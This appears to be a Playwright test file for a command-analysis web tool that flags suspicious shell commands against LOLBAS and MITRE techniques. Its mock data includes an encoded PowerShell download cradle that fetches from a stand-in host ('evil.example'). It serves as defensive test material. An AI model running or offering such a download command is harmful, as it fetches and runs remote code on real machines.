import { test, expect } from "@playwright/test";

// Full mock payload matching the current AnalyzeResponseSchema
const BENIGN_MOCK = {
  slug: "AAAAAAAAABBB",
  command: "ls -la /tmp",
  parsed: { kind: "command", pos: [0, 11], parts: [] },
  parsed_error: null,
  decoded_layers: [],
  lolbas_match: null,
  lolbas_matches: [],
  gtfobins_match: null,
  gtfobins_matches: [],
  loldrivers_match: null,
  threat_classes: [],
  parent_verdict: null,
  redacted: false,
  extracted_urls: [],
  vt_results: [],
  binaries_in_command: [],
  is_private: false,
};

const SUSPICIOUS_MOCK = {
  slug: "MFRA2YLBMFRA",
  command: "powershell -enc JABzAD0A",
  parsed: null,
  parsed_error: "parse error: unexpected token",
  decoded_layers: [
    { layer: 1, encoding: "base64-utf16le", value: "$s=New-Object Net.WebClient\n$s.DownloadString('http://evil.example')" },
  ],
  lolbas_match: {
    name: "Powershell.exe",
    description: "PowerShell is included in Windows by default.",
    url: "https://lolbas-project.github.io/lolbas/Binaries/Powershell/",
    techniques: ["T1059.001"],
    technique_details: [{ id: "T1059.001", name: "PowerShell", tactic: "Execution" }],
    functions: ["download", "execute"],
    similarity: 1.0,
  },
  lolbas_matches: [
    {
      name: "Powershell.exe",
      description: "PowerShell is included in Windows by default.",
      url: "https://lolbas-project.github.io/lolbas/Binaries/Powershell/",
      techniques: ["T1059.001"],
      technique_details: [{ id: "T1059.001", name: "PowerShell", tactic: "Execution" }],
      functions: ["download", "execute"],
      similarity: 1.0,
    },
  ],
  gtfobins_match: null,
  gtfobins_matches: [],
  loldrivers_match: null,
  threat_classes: [
    {
      name: "loader",
      label: "Loader",
      confidence: "high",
      signals: ["Executes base64-encoded PowerShell command"],
      techniques: [{ id: "T1059.001", name: "PowerShell", tactic: "Execution" }],
    },
  ],
  parent_verdict: null,
  redacted: false,
  extracted_urls: ["http://evil.example"],
  vt_results: [],
  binaries_in_command: [
    {
      name: "powershell.exe",
      source: "lolbas",
      description: "PowerShell is included in Windows by default.",
      abuse_note: null,
      functions: ["download", "execute"],
      techniques: [{ id: "T1059.001", name: "PowerShell", tactic: "Execution" }],
      url: "https://lolbas-project.github.io/lolbas/Binaries/Powershell/",
    },
  ],
  is_private: false,
};

test.describe("paste → redirect → render flow", () => {
  test("submitting a benign command redirects to /c/[slug] and renders low-signal verdict", async ({
    page,
  }) => {
    await page.route("**/analyze", async (route) => {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(BENIGN_MOCK) });
    });
    await page.route("**/c/AAAAAAAAABBB", async (route) => {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(BENIGN_MOCK) });
    });
    await page.route("**/settings/banner", async (route) => {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify({ enabled: false, message: "", type: "info" }) });
    });

    await page.goto("/");
    await expect(page.getByTestId("command-input")).toBeVisible();
    await page.getByTestId("command-input").fill("ls -la /tmp");
    await page.getByRole("button", { name: /analyze/i }).click();

    await page.waitForURL("**/c/AAAAAAAAABBB", { timeout: 10_000 });
    await expect(page.getByText(/low signal/i)).toBeVisible();
  });

  test("suspicious command shows encoded payload verdict and LOLBAS card", async ({
    page,
  }) => {
    await page.route("**/analyze", async (route) => {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(SUSPICIOUS_MOCK) });
    });
    await page.route("**/c/MFRA2YLBMFRA", async (route) => {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(SUSPICIOUS_MOCK) });
    });
    await page.route("**/settings/banner", async (route) => {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify({ enabled: false, message: "", type: "info" }) });
    });

    await page.goto("/");
    await page.getByTestId("command-input").fill("powershell -enc JABzAD0A");
    await page.getByRole("button", { name: /analyze/i }).click();

    await page.waitForURL("**/c/MFRA2YLBMFRA", { timeout: 10_000 });
    await expect(page.getByText(/suspicious/i).first()).toBeVisible();
    await expect(page.getByText(/Powershell\.exe/i)).toBeVisible();
    await expect(page.getByText(/T1059\.001/)).toBeVisible();
  });

  test("slug URL matches base32 pattern (12 uppercase chars)", async ({ page }) => {
    await page.route("**/analyze", async (route) => {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(BENIGN_MOCK) });
    });
    await page.route("**/settings/banner", async (route) => {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify({ enabled: false, message: "", type: "info" }) });
    });

    await page.goto("/");
    await page.getByTestId("command-input").fill("ls -la /tmp");
    await page.getByRole("button", { name: /analyze/i }).click();

    await page.waitForURL(/\/c\/[A-Z2-7]{12}/, { timeout: 10_000 });
    const match = page.url().match(/\/c\/([A-Z2-7]{12})/);
    expect(match).not.toBeNull();
  });
});

test.describe("recent page", () => {
  const RECENT_MOCK = [
    {
      slug: "AAAAAAAAABBB",
      command: "ls -la /tmp",
      has_lolbas: false,
      has_encoding: false,
      threat_labels: [],
      created_at: new Date().toISOString(),
    },
    {
      slug: "MFRA2YLBMFRA",
      command: "powershell -enc JABzAD0A",
      has_lolbas: true,
      has_encoding: true,
      threat_labels: ["Encoded execution"],
      created_at: new Date().toISOString(),
    },
  ];

  test("recent page lists recent analyses", async ({ page }) => {
    await page.route("**/recent**", async (route) => {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(RECENT_MOCK) });
    });
    await page.route("**/settings/banner", async (route) => {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify({ enabled: false, message: "", type: "info" }) });
    });

    await page.goto("/recent");
    await expect(page.getByText("ls -la /tmp")).toBeVisible();
    await expect(page.getByText("powershell -enc JABzAD0A")).toBeVisible();
  });
});

test.describe("search page", () => {
  test("search returns results matching query", async ({ page }) => {
    await page.route("**/search**", async (route) => {
      await route.fulfill({
        status: 200,
        contentType: "application/json",
        body: JSON.stringify([
          {
            slug: "MFRA2YLBMFRA",
            command: "powershell -enc JABzAD0A",
            has_lolbas: true,
            has_encoding: true,
            threat_labels: ["Encoded execution"],
            created_at: new Date().toISOString(),
          },
        ]),
      });
    });
    await page.route("**/settings/banner", async (route) => {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify({ enabled: false, message: "", type: "info" }) });
    });

    await page.goto("/search");
    const input = page.getByRole("searchbox").or(page.getByPlaceholder(/search/i));
    await expect(input).toBeVisible();
    await input.fill("powershell");
    await input.press("Enter");

    await expect(page.getByText("powershell -enc JABzAD0A")).toBeVisible();
  });
});

test.describe("analysis page direct visit", () => {
  test("visiting /c/[slug] directly renders analysis", async ({ page }) => {
    await page.route("**/c/AAAAAAAAABBB", async (route) => {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify(BENIGN_MOCK) });
    });
    await page.route("**/settings/banner", async (route) => {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify({ enabled: false, message: "", type: "info" }) });
    });

    await page.goto("/c/AAAAAAAAABBB");
    await expect(page.getByText(/low signal/i)).toBeVisible();
    await expect(page.getByText("ls -la /tmp")).toBeVisible();
  });

  test("visiting deleted analysis shows tombstone", async ({ page }) => {
    await page.route("**/c/DELETEDSLUG1", async (route) => {
      await route.fulfill({
        status: 200,
        contentType: "application/json",
        body: JSON.stringify({ slug: "DELETEDSLUG1", deleted: true }),
      });
    });
    await page.route("**/settings/banner", async (route) => {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify({ enabled: false, message: "", type: "info" }) });
    });

    await page.goto("/c/DELETEDSLUG1");
    await expect(page.getByText(/analysis deleted/i)).toBeVisible();
  });
});
